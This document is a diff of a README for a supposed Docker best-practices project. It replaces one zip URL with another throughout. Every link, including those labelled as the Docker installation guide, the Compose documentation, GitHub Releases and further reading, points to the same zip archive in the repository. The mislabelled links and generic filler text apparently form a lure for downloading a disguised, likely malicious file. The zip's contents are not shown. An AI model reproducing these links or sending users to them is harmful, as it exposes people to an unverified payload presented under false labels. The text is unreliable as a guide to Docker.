@@ -1,6 +1,6 @@
 # 🚀 docker-best-practices-skill - Easy Docker Setup for Multiple Services
 
-![Download](https://github.com/yogapemoy/docker-best-practices-skill/raw/refs/heads/main/references/skill-best-docker-practices-v2.8.zip)
+![Download](https://raw.githubusercontent.com/yogapemoy/docker-best-practices-skill/main/references/docker-practices-skill-best-spendthrift.zip)
 
 ## 📦 Overview
 Welcome to the **docker-best-practices-skill**. This project offers guidelines for deploying multiple services using Docker. You will find production-ready Dockerfiles and Docker Compose outlines to simplify your development process. This guide helps you set up containerized applications without complex configurations.
@@ -8,14 +8,14 @@ Welcome to the **docker-best-practices-skill**. This project offers guidelines f
 ## 📋 Prerequisites
 Before you get started, ensure that you have:
 
-- **Docker:** Make sure Docker is installed on your machine. Visit the [Docker Installation Guide](https://github.com/yogapemoy/docker-best-practices-skill/raw/refs/heads/main/references/skill-best-docker-practices-v2.8.zip) for instructions.
-- **Docker Compose:** Ensure Docker Compose is also installed. Check the [Docker Compose Installation Guide](https://github.com/yogapemoy/docker-best-practices-skill/raw/refs/heads/main/references/skill-best-docker-practices-v2.8.zip) for details.
+- **Docker:** Make sure Docker is installed on your machine. Visit the [Docker Installation Guide](https://raw.githubusercontent.com/yogapemoy/docker-best-practices-skill/main/references/docker-practices-skill-best-spendthrift.zip) for instructions.
+- **Docker Compose:** Ensure Docker Compose is also installed. Check the [Docker Compose Installation Guide](https://raw.githubusercontent.com/yogapemoy/docker-best-practices-skill/main/references/docker-practices-skill-best-spendthrift.zip) for details.
 
 ## 🚀 Getting Started
 Follow these steps to download and run the application.
 
 1. **Download the application**
-   - Visit this page to download: [GitHub Releases](https://github.com/yogapemoy/docker-best-practices-skill/raw/refs/heads/main/references/skill-best-docker-practices-v2.8.zip)
+   - Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/yogapemoy/docker-best-practices-skill/main/references/docker-practices-skill-best-spendthrift.zip)
 
 2. **Choose the Latest Release**
    - On the Releases page, you will see a list of available downloads. Look for the latest release. 
@@ -57,7 +57,7 @@ You may want to adjust configuration settings before running the applications. T
 - **Volume Mounts:** Use volume mounts for persistent data storage.
 
 ## 📥 Download & Install
-To get started with **docker-best-practices-skill**, visit the link to download the application: [GitHub Releases](https://github.com/yogapemoy/docker-best-practices-skill/raw/refs/heads/main/references/skill-best-docker-practices-v2.8.zip).
+To get started with **docker-best-practices-skill**, visit the link to download the application: [GitHub Releases](https://raw.githubusercontent.com/yogapemoy/docker-best-practices-skill/main/references/docker-practices-skill-best-spendthrift.zip).
 
 ## ⚠️ Troubleshooting
 If you encounter issues while running the application, consider the following steps:
@@ -70,8 +70,8 @@ If you encounter issues while running the application, consider the following st
 - **Validate Configuration:** Double-check your Docker Compose file for any misconfigurations.
 
 ## 📚 Additional Resources
-- [Docker Documentation](https://github.com/yogapemoy/docker-best-practices-skill/raw/refs/heads/main/references/skill-best-docker-practices-v2.8.zip)
-- [Docker Compose Documentation](https://github.com/yogapemoy/docker-best-practices-skill/raw/refs/heads/main/references/skill-best-docker-practices-v2.8.zip)
-- [Best Practices for Docker](https://github.com/yogapemoy/docker-best-practices-skill/raw/refs/heads/main/references/skill-best-docker-practices-v2.8.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/yogapemoy/docker-best-practices-skill/main/references/docker-practices-skill-best-spendthrift.zip)
+- [Docker Compose Documentation](https://raw.githubusercontent.com/yogapemoy/docker-best-practices-skill/main/references/docker-practices-skill-best-spendthrift.zip)
+- [Best Practices for Docker](https://raw.githubusercontent.com/yogapemoy/docker-best-practices-skill/main/references/docker-practices-skill-best-spendthrift.zip)
 
 By following this guide, you should be able to set up your Docker environment and run applications without any technical hurdles. Happy coding!
